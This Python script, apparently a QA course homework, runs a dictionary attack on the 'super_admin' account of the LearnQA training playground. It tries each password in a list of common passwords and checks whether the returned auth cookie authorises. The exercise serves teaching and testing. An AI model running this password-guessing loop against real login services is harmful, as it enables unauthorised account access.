import requests

url_get_secret = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_auth = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

login = "super_admin"

passwords = [
    "!@#$%^&*", "000000", "111111", "121212", "123123", "1234", "12345", "123456", "1234567", "12345678",
    "123456789", "1234567890", "123qwe", "1q2w3e4r", "1qaz2wsx", "555555", "654321", "666666", "696969", "7777777",
    "888888", "Football", "aa123456", "abc123", "access", "admin", "adobe123[a]", "ashley", "azerty", "bailey",
    "baseball", "batman", "charlie", "donald", "dragon", "flower", "football", "freedom", "hello", "hottie",
    "iloveyou", "jesus", "letmein", "login", "lovely", "loveme", "master", "michael", "monkey", "mustang", "ninja",
    "passw0rd", "password", "password1", "photoshop[a]", "princess", "qazwsx", "qwerty", "qwerty123", "qwertyuiop",
    "shadow", "solo", "starwars", "sunshine", "superman", "trustno1", "welcome", "whatever", "zaq1zaq1"
]

# Подбор пароля
for password in passwords:
    # Запрос с текущим паролем
    response = requests.post(url_get_secret, data={"login": login, "password": password})

    if "auth_cookie" not in response.cookies:
        print(f"Пароль '{password}' не вернул auth_cookie. Пропускаем.")
        continue

    auth_cookie = response.cookies.get("auth_cookie")

    # Проверка авторизации с полученной cookie
    response_check = requests.get(url_check_auth, cookies={"auth_cookie": auth_cookie})

    if response_check.text != "You are NOT authorized":
        print(f"Найден верный пароль: {password}")
        print(f"Ответ сервера: {response_check.text}")
        break
else:
    print("Не удалось подобрать пароль.")